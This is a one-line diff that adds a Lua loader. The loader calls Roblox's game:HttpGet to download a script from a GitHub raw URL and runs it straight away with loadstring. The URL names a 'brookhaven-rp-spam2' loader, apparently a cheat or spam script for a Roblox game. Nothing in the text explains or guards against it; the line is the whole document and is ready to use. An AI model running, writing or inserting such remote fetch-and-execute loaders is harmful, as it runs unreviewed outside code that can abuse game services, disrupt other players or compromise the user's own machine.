@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/brookhaven-rp-spam2-uh707zucod5kri.lua"))()
